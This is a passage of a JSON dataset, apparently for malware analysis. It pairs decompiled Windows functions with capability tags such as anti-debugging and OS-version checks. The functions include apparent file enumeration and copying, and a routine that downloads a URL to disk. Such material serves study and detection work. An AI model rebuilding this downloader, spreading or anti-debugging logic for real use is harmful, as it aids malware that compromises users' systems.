        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nushort * __cdecl fcn.004077a0(int32_t arg_8h, uint arg_ch, int32_t arg_10h, uint *arg_14h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    ushort *puVar4;\n    uint uVar5;\n    bool bVar6;\n    uint var_1h;\n    \n    if (((arg_10h != 1) && (arg_10h != 2)) && (arg_10h != 3)) {\n        *arg_14h = 0x10000;\n        return NULL;\n    }\n    bVar6 = false;\n    *arg_14h = 0;\n    var_1h._0_1_ = 0;\n    uVar1 = var_1h;\n    var_1h._0_1_ = 0;\n    iVar2 = arg_8h;\n    if (arg_10h == 1) {\ncode_r0x0040781d:\n        var_1h._0_1_ = uVar1;\n        iVar3 = (**0x469108)(iVar2, 0, 0, 1);\n        bVar6 = iVar3 != -1;\n    }\n    else {\n        iVar2 = 0;\n        if (arg_10h == 2) {\n            iVar2 = (**0x4690ec)(arg_8h, 0x80000000, 1, 0, 3, 0x80, 0);\n            if (iVar2 == -1) {\n                *arg_14h = 0x200;\n                return NULL;\n            }\n            var_1h._0_1_ = 1;\n            uVar1 = var_1h;\n            goto code_r0x0040781d;\n        }\n    }\n    puVar4 = fcn.0042b9b1(0x20);\n    if ((arg_10h == 1) || (arg_10h == 2)) {\n        *puVar4 = 1;\n        *(puVar4 + 8) = var_1h;\n        *(puVar4 + 1) = bVar6;\n        *(puVar4 + 2) = iVar2;\n        *(puVar4 + 4) = 0;\n        *(puVar4 + 6) = 0;\n        if (bVar6 == false) goto code_r0x00407893;\n        uVar5 = (**0x469108)(iVar2, 0, 0, 1);\n    }\n    else {\n        *(puVar4 + 0xc) = arg_ch;\n        uVar5 = 0;\n        *puVar4 = 0x100;\n        *(puVar4 + 8) = 0;\n        *(puVar4 + 10) = arg_8h;\n        *(puVar4 + 0xe) = 0;\n    }\n    *(puVar4 + 6) = uVar5;\ncode_r0x00407893:\n    *arg_14h = 0;\n    return puVar4;\n}\n",
        "token_count": 708
    },
    "0040d220": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040d220(uint noname_0, uint noname_1, uint noname_2, uint noname_3, int32_t noname_4, uint32_t noname_5, \n            uint noname_6, int32_t noname_7, int32_t noname_8, uint noname_9, uint32_t noname_10, uint32_t noname_11, \n            uint noname_12, uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, \n            uint noname_18, uint noname_19, uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint arg_8h\n            , uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, uint arg_24h, \n            uint arg_28h, uint arg_2ch, uint arg_30h, uint arg_34h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint arg_ch_00;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint *unaff_EDI;\n    ulong uVar7;\n    uint unaff_retaddr;\n    uint var_4h;\n    uchar auStack8144 [4];\n    uint uStack8140;\n    int32_t iStack8136;\n    uint uStack8132;\n    int32_t iStack8128;\n    uint uStack8124;\n    uint uStack8120;\n    uint uStack8116;\n    uchar auStack8108 [44];\n    uchar auStack8064 [12];\n    uint var_1fd0h;\n    uint var_1fcch;\n    uint var_1fc8h;\n    uint var_1fc4h;\n    uint var_1fc0h;\n    uint var_1fbch;\n    uint var_1fb8h;\n    uint var_1fb4h;\n    uint var_1fb0h;\n    uint var_1fa8h;\n    uint var_1f7ch;\n    uchar auStack7788 [96];\n    uint var_1e68h;\n    uchar auStack2788 [96];\n    uint var_ae0h;\n    uchar auStack1788 [96];\n    uint var_6f8h;\n    uint auStack1528 [24];\n    uint var_5f4h;\n    uint var_20ch_2;\n    uint var_20ch;\n    uint auStack268 [24];\n    uint var_108h;\n    uint uStack84;\n    uint *arg_8h_00;\n    uchar *puVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uchar *noname_14_00;\n    uchar *noname_15_00;\n    \n    fcn.0042ae40();\n    uStack8116 = noname_0;\n    uStack8120 = noname_1;\n    uStack8124 = noname_2;\n    uStack8132 = noname_3;\n    uStack8140 = noname_6;\n    (**0x4690ac)();\n    noname_15_00 = &stack0xffffe054;\n    noname_14_00 = &stack0xfffff904;\n    iVar2 = (**0x469318)();\n    iStack8136 = iVar2;\n    fcn.0042acb0();\n    puVar8 = &stack0xffffe194;\n    uVar9 = noname_6;\n    (**0x469258)();\n    uVar7 = CONCAT44(uVar9, puVar8);\n    iStack8128 = 0;\n    if (iVar2 != -1) {\n        do {\n            iVar2 = (**0x469288)();\n            if (((iVar2 != 0) && (iVar2 = (**0x469288)(),  iVar2 != 0)) &&\n               (iVar2 = fcn.0040b3d0(uStack8124, 0x80000000),  iVar2 != 0)) {\n                puVar6 = &fcn.0040d220::var_20ch_2;\n                (**0x469304)();\n                uVar9 = 0x445418;\n                puVar5 = &fcn.0040d220::var_20ch_2;\n                (**0x469258)();\n                puVar8 = &stack0xffffe080;\n                (**0x469258)();\n                uVar11 = uVar7 >> 0x20;\n                if (noname_8 == 0) {\n                    uVar10 = 0xf;\n                    uVar4 = puVar8 & 0xffffff00;\n                    arg_ch_00 = fcn.0042b420();\n                    arg_8h_00 = &fcn.0040d220::var_20ch_2;\n                    fcn.00406270(arg_8h_00, arg_ch_00);\n                    iVar2 = fcn.0040ce80(arg_8h_00, arg_ch_00, uVar4, puVar5, uVar9, puVar6);\n                    uVar7 = CONCAT44(uVar11, uVar10);\n                    if (iVar2 != 0) goto code_r0x0040d62f;\n                }\n                fcn.0042acb0();\n                fcn.0042acb0();\n                iVar2 = (**0x469288)();\n                if (iVar2 == 0) {\n                    (**0x4690ac)();\n                }\n                else {\n                    (**0x4690ac)();\n                }\n                iVar2 = (**0x469150)();\n                if (iVar2 < 4) {\n                    if ((noname_8 == 0) || (iVar2 = (**0x469154)(),  iVar2 == 0)) {\n                        iVar2 = (**0x469154)();\n                        if (iVar2 != 0) {\n                            (**0x469304)();\n                            (**0x469258)();\n                            (**0x469258)();\n                            unaff_EDI = &fcn.0040d220::var_20ch_2;\n                            uVar7 = fcn.00420fc0(unaff_EDI);\n                            noname_15_00 = NULL;\n                            noname_14_00 = 0x3e8;\n                            uVar4 = fcn.0042d920();\n                            if (uVar4 < noname_5) {\n                                if (*0x458698 <= *0x4586a4) goto code_r0x0040d658;\n                                iVar2 = fcn.0040b3d0(uStack8124, 0xc0000000);\n                                if (iVar2 != 0) {\n                                    puVar6 = &fcn.0040d220::var_20ch_2;\n                                    goto code_r0x0040d836;\n                                }\n                            }\n                        }\n                    }\n                    else {\n                        (**0x46927c)();\n                        fcn.0040b290(&fcn.0040d220::var_20ch_2, &stack0xfffffa08);\n                        (**0x469260)();\n                        iVar2 = (**0x469154)();\n                        if (iVar2 != 0) {\n                            (**0x469304)();\n                            (**0x469258)();\n                            (**0x469114)();\n                            (**0x469258)();\n                            unaff_EDI = &stack0xfffffa08;\n                            uVar7 = fcn.00420fc0(unaff_EDI);\n                            noname_15_00 = NULL;\n                            noname_14_00 = 0x3e8;\n                            uVar4 = fcn.0042d920();\n                            if (uVar4 < noname_5) {\n                                if (*0x458698 <= *0x4586a4) goto code_r0x0040d658;\n                                iVar2 = fcn.0040b3d0(uStack8124, 0xc0000000);\n                                if (iVar2 != 0) {\n                                    puVar6 = &stack0xfffffa08;\ncode_r0x0040d836:\n                                    puVar5 = puVar6;\n                                    if (noname_7 == 0) {\n                                        puVar5 = &stack0xfffffef4;\n                                    }\n                                    fcn.00429f90(uStack8116, puVar5, puVar6);\n                                    *0x4586a4 = *0x4586a4 + uVar4;\n                                }\n                            }\n                        }\n                    }\n                }\n                else {\n                    iVar2 = fcn.0042d83d(&stack0xffffe194, 0x446fd4, &stack0xffffe030);\n                    bVar1 = false;\n                    iStack8128 = 0;\n                    if ((noname_8 != 0) && (iVar3 = (**0x469154)(),  iVar3 != 0)) {\n                        bVar1 = true;\n                        (**0x46927c)();\n                        fcn.0040b290(&fcn.0040d220::var_20ch_2, &stack0xfffffa08);\n                        (**0x469260)();\n                    }\n                    if (iVar2 != 0) {\n                        do {\n                            iVar2 = (**0x4691c8)();\n                            if (iVar2 != 0) {\n                                iStack8128 = 1;\n                            }\n                            iVar2 = fcn.0042d83d(0, 0x446fd4, &stack0xffffe030);\n                        } while (iVar2 != 0);\n                        if (iStack8128 != 0) goto code_r0x0040d5d9;\n                    }\n                    if (bVar1) {\n                        iVar2 = (**0x469154)();\n                        if (iVar2 != 0) {\n                            (**0x469304)();\n                            (**0x469258)();\n                            (**0x469114)();\n                            (**0x469258)();\n                            unaff_EDI = &stack0xfffffa08;\n                            uVar7 = fcn.00420fc0(unaff_EDI);\n                            noname_15_00 = NULL;\n                            noname_14_00 = 0x3e8;\n                            uVar4 = fcn.0042d920();\n                            if (uVar4 < noname_5) {\n                                if (*0x458698 <= *0x4586a4) goto code_r0x0040d658;\n                                iVar2 = fcn.0040b3d0(uStack8124, 0xc0000000);\n                                if (iVar2 != 0) {\n                                    puVar5 = &stack0xfffffa08;\n                                    puVar6 = puVar5;\n                                    if (noname_7 == 0) {\n                                        puVar6 = &stack0xfffffef4;\n                                    }\ncode_r0x0040d5c5:\n                                    fcn.00429f90(uStack8116, puVar6, puVar5);\n                                    *0x4586a4 = *0x4586a4 + uVar4;\n                                }\n                            }\n                        }\n                    }\n                    else {\n                        iVar2 = (**0x469154)();\n                        if (iVar2 != 0) {\n                            (**0x469304)();\n                            (**0x469258)();\n                            (**0x469258)();\n                            unaff_EDI = &fcn.0040d220::var_20ch_2;\n                            uVar7 = fcn.00420fc0(unaff_EDI);\n                            noname_15_00 = NULL;\n                            noname_14_00 = 0x3e8;\n                            uVar4 = fcn.0042d920();\n                            if (uVar4 < noname_5) {\n                                if (*0x458698 <= *0x4586a4) goto code_r0x0040d658;\n                                iVar2 = fcn.0040b3d0(uStack8124, 0xc0000000);\n                                if (iVar2 != 0) {\n                                    puVar5 = &fcn.0040d220::var_20ch_2;\n                                    puVar6 = puVar5;\n                                    if (noname_7 == 0) {\n                                        puVar6 = &stack0xfffffef4;\n                                    }\n                                    goto code_r0x0040d5c5;\n                                }\n                            }\n                        }\n                    }\n                }\ncode_r0x0040d5d9:\n                if (noname_4 != 0) {\n                    if (noname_10 < noname_11) break;\n                    if (iStack8128 == 0) {\n                        uStack84 = 0x40d62c;\n                        fcn.0040d220(uStack8116, &stack0xfffff51c, &fcn.0040d220::var_20ch_2, uStack8132, noname_4, \n                                     noname_5, uStack8140, noname_7, noname_8, noname_9, noname_10, noname_11 + 1, uVar7\n                                     , uVar7 >> 0x20, noname_14_00, noname_15_00, unaff_EDI, unaff_ESI, unaff_EBX, \n                                     unaff_EBP, unaff_retaddr, noname_0, noname_1, noname_2, noname_3, noname_4, \n                                     noname_5, noname_6, noname_7, noname_8, noname_9, noname_10, noname_11, noname_12, \n                                     noname_13, noname_14);\n                    }\n                }\n            }\ncode_r0x0040d62f:\n            iVar2 = (**0x469170)();\n        } while (iVar2 != 0);\n        (**0x4690e0)();\n    }\ncode_r0x0040d658:\n    fcn.0042ad2a(noname_15_00);\n    return;\n}\n",
        "token_count": 3094
    },
    "00414b40": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414b40(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint arg_8h_00;\n    uint32_t var_51ch;\n    uint var_518h;\n    uint var_514h;\n    int32_t var_510h;\n    int32_t var_50ch;\n    uint32_t var_508h;\n    uint var_504h;\n    uint var_104h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    arg_8h_00 = 0;\n    var_518h = arg_ch;\n    var_510h = 0;\n    var_514h = 0x100;\n    iVar1 = (**0x469194)(0x4453cc, 1, 0, 0, 0);\n    if (iVar1 != 0) {\n        uVar4 = 0x447144;\n        uVar2 = fcn.00414ac0(arg_8h);\n        iVar3 = (**0x469288)(uVar2, uVar4);\n        if (iVar3 == 0) {\n            var_510h = 1;\n        }\n        var_50ch = 0;\n        do {\n            if (var_510h == 0) {\n                uVar2 = 0x100;\n            }\n            else {\n                uVar2 = 0x800100;\n            }\n            uVar2 = (**0x469198)(iVar1, arg_8h, 0, 0, uVar2, 0);\n            iVar3 = (**0x46930c)(uVar2, 0x13, &var_104h, &var_514h, 0);\n            if (iVar3 != 0) {\n                iVar3 = (**0x469288)(&var_104h, 0x4472f0);\n                if (iVar3 == 0) break;\n                (**0x4690c8)(1000);\n            }\n            var_50ch = var_50ch + 1;\n        } while (var_50ch < 3);\n        uVar4 = (**0x4690ec)(var_518h, 0x40000000, 3, 0, 2, 0x80, 0);\n        iVar3 = (**0x4691b8)(uVar2, &var_504h, 0x400, &var_508h);\n        while ((iVar3 != 0 &&\n               (((var_508h == 0 ||\n                 ((iVar3 = (**0x469158)(uVar4, &var_504h, var_508h, &var_51ch, 0),  iVar3 != 0 && (var_508h == var_51ch)\n                  ))) && (0x3ff < var_508h))))) {\n            iVar3 = (**0x4691b8)(uVar2, &var_504h, 0x400, &var_508h);\n        }\n        fcn.0042acb0(&var_504h, 0, 0x400);\n        (**0x4690f0)(uVar4);\n        (**0x469190)(uVar2);\n        (**0x469190)(iVar1);\n    }\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 773
    },
    "00417130": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nvoid __cdecl fcn.00417130(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint unaff_ESI;\n    ulong uVar4;\n    uint var_564h;\n    uint var_560h;\n    uint var_55ch;\n    uint var_554h;\n    uint var_528h;\n    uint var_414h;\n    uint var_310h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    (**0x4690ac)(&var_414h, 0x446f98, arg_8h);\n    iVar1 = (**0x469318)(&var_414h, &var_554h);\n    if (iVar1 != -1) {\n        do {\n            *(in_ECX + 0x1c) = *(in_ECX + 0x1c) + 1;\n            iVar2 = (**0x469288)(&var_528h, 0x446e5c);\n            if ((iVar2 != 0) && (iVar2 = (**0x469288)(&var_528h, 0x446e58),  iVar2 != 0)) {\n                fcn.0042acb0(&var_310h, 0, 0x104);\n                fcn.0042acb0(&var_108h, 0, 0x104);\n                (**0x469258)(&var_310h, arg_8h);\n                (**0x469258)(&var_310h, 0x445418);\n                (**0x469258)(&var_310h, &var_528h);\n                (**0x469258)(&var_108h, 0x445418);\n                uVar3 = *0x458528;\n                if (arg_18h != 0) {\n                    uVar3 = *0x457e2c;\n                }\n                (**0x469258)(&var_108h, uVar3);\n                (**0x469258)(&var_108h, 0x445418);\n                (**0x469258)(&var_108h, arg_ch);\n                (**0x469258)(&var_108h, 0x445418);\n                (**0x469258)(&var_108h, arg_10h);\n                (**0x469258)(&var_108h, 0x445418);\n                (**0x469258)(&var_108h, arg_14h);\n                if (arg_1ch - 1U < 4) {\n                    switch(*((arg_1ch - 1U) * 4 + 0x4168b8)) {\n                    case 0x220ec:\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    case 0x81ec8b55:\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    case 0xcccccccc:\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n                }\n                (**0x469258)(&var_108h, 0x445418);\n                (**0x469258)(&var_108h, &var_528h);\n                fcn.0042acb0(&var_20ch, 0, 0x104);\n                (**0x469258)(&var_20ch, *0x458374);\n                uVar3 = fcn.00420ef0(0x1a);\n                (**0x469258)(&var_20ch, uVar3);\n                (**0x469100)(&var_310h, &var_20ch, 1);\n                uVar4 = fcn.00420fc0(&var_20ch);\n                uVar3 = fcn.0042d920(uVar4, 1000, 0);\n                fcn.0040b5c0(uVar3);\n                iVar2 = (**0x469288)(arg_ch, *0x458548);\n                if (iVar2 == 0) {\n                    fcn.0040b880();\n                }\n                iVar2 = (**0x469288)(arg_ch, *0x458558);\n                if (iVar2 == 0) {\n                    fcn.0040b880();\n                }\n                fcn.00429f90(*(in_ECX + 0x20), &var_108h, &var_20ch);\n                (**0x46915c)(&var_20ch);\n            }\n            iVar2 = (**0x469170)(iVar1, &var_554h);\n        } while (iVar2 != 0);\n        (**0x4690e0)(iVar1);\n    }\n    fcn.0042ad2a(unaff_ESI);\n    return;\n}\n",
        "token_count": 1136
    },
    "00417ac0": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417ac0(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h == 3) {\n        fcn.004174d0(0x4478cc, 0x4478f0, arg_8h, arg_ch, 1, 3, 0, 0, 1);\n        return;\n    }\n    fcn.004174d0(*0x4584e0, *0x457e8c, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x458500, *0x458548, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x45817c, *0x458558, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x4582d4, *0x457eec, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x45800c, *0x457d7c, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x457db4, *0x458438, arg_8h, arg_ch, 1, arg_10h, 0, 0, 1);\n    fcn.004174d0(*0x45801c, *0x457e20, arg_8h, arg_ch, 1, arg_10h, 1, 0, 1);\n    fcn.004174d0(*0x4585a8, *0x4581ec, arg_8h, arg_ch, 1, arg_10h, 0, 0, 1);\n    fcn.004174d0(*0x45850c, *0x458074, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x457ec0, *0x457ff8, arg_8h, arg_ch, 1, arg_10h, 0, 1, 0);\n    fcn.004174d0(*0x4584b8, *0x4582a0, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x45853c, *0x458284, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x457e48, *0x4583d8, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x458310, *0x4581d8, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x458440, *0x458018, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x45806c, *0x458520, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x45825c, *0x457de8, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x458508, *0x457ee8, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x45844c, *0x458258, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x458380, *0x458014, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x4584fc, *0x4584f4, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x458268, *0x458064, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x4584f0, *0x457da8, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x458270, *0x458320, arg_8h, arg_ch, 1, arg_10h, 1, 1, 1);\n    fcn.004174d0(*0x4580dc, *0x4582bc, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x457f80, *0x458368, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x457dc4, *0x458548, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x458088, *0x457e14, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x45824c, *0x4582f8, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x4580d8, *0x457fe8, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x458170, *0x457e68, arg_8h, arg_ch, 1, arg_10h, 0, 0, 1);\n    fcn.004174d0(*0x458230, *0x457e44, arg_8h, arg_ch, 1, arg_10h, 0, 0, 1);\n    fcn.004174d0(*0x45816c, *0x457fe4, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x457fbc, *0x4583a4, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x457f50, *0x457e88, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x45813c, *0x457d8c, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x458434, *0x45831c, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x458480, *0x4580b4, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x457d70, *0x457f90, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x457f7c, *0x458424, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x458248, *0x458538, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x457d40, *0x45832c, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(*0x4580b0, *0x458254, arg_8h, arg_ch, 0, arg_10h, 1, 1, 0);\n    fcn.004174d0(*0x45840c, *0x457dc0, arg_8h, arg_ch, 0, arg_10h, 1, 1, 1);\n    fcn.004174d0(*0x458044, *0x457e64, arg_8h, arg_ch, 0, arg_10h, 1, 1, 1);\n    fcn.004174d0(*0x45820c, *0x4584ec, arg_8h, arg_ch, 0, arg_10h, 1, 1, 1);\n    fcn.004174d0(0x4478a0, 0x4478c4, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(0x44786c, 0x447890, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(0x447834, 0x447858, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(0x447808, 0x44782c, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(0x4477dc, 0x447800, arg_8h, arg_ch, 1, arg_10h, 1, 1, 1);\n    fcn.004174d0(0x4477a8, 0x4477cc, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(0x44777c, 0x4477a0, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(0x44774c, 0x447770, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(0x447720, 0x447744, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(0x4476f0, 0x447714, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(0x4476bc, 0x4476e0, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(0x447688, 0x4476ac, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(0x447654, 0x447678, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(0x447628, 0x44764c, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(0x4475f8, 0x44761c, arg_8h, arg_ch, 1, arg_10h, 1, 0, 0);\n    fcn.004174d0(0x4475c0, 0x4475e4, arg_8h, arg_ch, 0, arg_10h, 1, 0, 0);\n    fcn.004174d0(0x447590, 0x4475b4, arg_8h, arg_ch, 0, arg_10h, 1, 0, 0);\n    fcn.004174d0(0x44755c, 0x447580, arg_8h, arg_ch, 0, arg_10h, 1, 0, 0);\n    fcn.004174d0(0x447524, 0x447548, arg_8h, arg_ch, 0, arg_10h, 1, 0, 0);\n    fcn.004174d0(0x447590, 0x4475b4, arg_8h, arg_ch, 0, arg_10h, 1, 0, 0);\n    return;\n}\n",
        "token_count": 3179
    },
    "00419ea0": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __fastcall fcn.00419ea0(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    uint uVar4;\n    uchar *var_38h;\n    int32_t var_34h;\n    uchar var_2dh;\n    uint *var_2ch;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43eb08;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = uVar1;\n    if ((**(param_1 + 0x20) == 0) || (**(param_1 + 0x30) + **(param_1 + 0x20) <= **(param_1 + 0x20))) {\n        if (*(param_1 + 0x54) != 0) {\n            if (**(param_1 + 0x10) == param_1 + 0x48) {\n                uVar4 = *(param_1 + 0x40);\n                **(param_1 + 0x10) = *(param_1 + 0x3c);\n                **(param_1 + 0x20) = uVar4;\n                **(param_1 + 0x30) = 0;\n            }\n            if (*(param_1 + 0x44) == 0) {\n                fcn.0042dbfe(*(param_1 + 0x54));\n            }\n            else {\n                var_18h = 0xf;\n                var_1ch = 0;\n                var_2ch = var_2ch & 0xffffff00;\n                var_4h = 0;\n                iVar2 = fcn.0042dbfe(*(param_1 + 0x54));\n                while (iVar2 != -1) {\n                    uVar4 = 1;\n                    fcn.0040bc10(1, iVar2);\n                    puVar3 = var_2ch;\n                    if (var_18h < 0x10) {\n                        puVar3 = &var_2ch;\n                    }\n                    iVar2 = (**(**(param_1 + 0x44) + 0x10))\n                                      (param_1 + 0x4c, puVar3, puVar3 + var_1ch, &var_34h, &var_2dh, &var_2ch, &var_38h\n                                       , uVar4, iVar2, uVar1);\n                    if (iVar2 < 0) break;\n                    if (iVar2 < 2) {\n                        if (var_38h != &var_2dh) {\n                            puVar3 = var_2ch;\n                            if (var_18h < 0x10) {\n                                puVar3 = &var_2ch;\n                            }\n                            for (iVar2 = puVar3 + (var_1ch - var_34h); 0 < iVar2; iVar2 = iVar2 + -1) {\n                                fcn.0042ded1(*(iVar2 + -1 + var_34h), *(param_1 + 0x54));\n                            }\n                            fcn.00405ce0();\n                            goto code_r0x0041a032;\n                        }\n                        puVar3 = var_2ch;\n                        if (var_18h < 0x10) {\n                            puVar3 = &var_2ch;\n                        }\n                        uVar1 = 0;\n                        fcn.00405a90(0, var_34h - puVar3);\n                    }\n                    else {\n                        if (iVar2 != 3) break;\n                        if (var_1ch != 0) {\n                            puVar3 = var_2ch;\n                            if (var_18h < 0x10) {\n                                puVar3 = &var_2ch;\n                            }\n                            fcn.0042e3cb(&var_2dh, 1, puVar3, 1);\n                            fcn.00405ce0();\n                            goto code_r0x0041a032;\n                        }\n                    }\n                    iVar2 = fcn.0042dbfe(*(param_1 + 0x54));\n                }\n                fcn.00405ce0();\n            }\n        }\n    }\n    else {\n        **(param_1 + 0x30) = **(param_1 + 0x30) + -1;\n        **(param_1 + 0x20) = **(param_1 + 0x20) + 1;\n    }\ncode_r0x0041a032:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(var_38h);\n    return;\n}\n",
        "token_count": 1125
    },
    "0041a520": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.0041a520(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    char *pcVar3;\n    uint uVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint *var_38h;\n    int32_t var_34h;\n    uint32_t var_30h;\n    uint *var_2ch;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43eb08;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (arg_8h != 0xffffffff) {\n        uVar1 = **(in_ECX + 0x24);\n        if ((uVar1 == 0) || (piVar2 = *(in_ECX + 0x34),  *piVar2 + uVar1 <= uVar1)) {\n            if (*(in_ECX + 0x54) != 0) {\n                if (**(in_ECX + 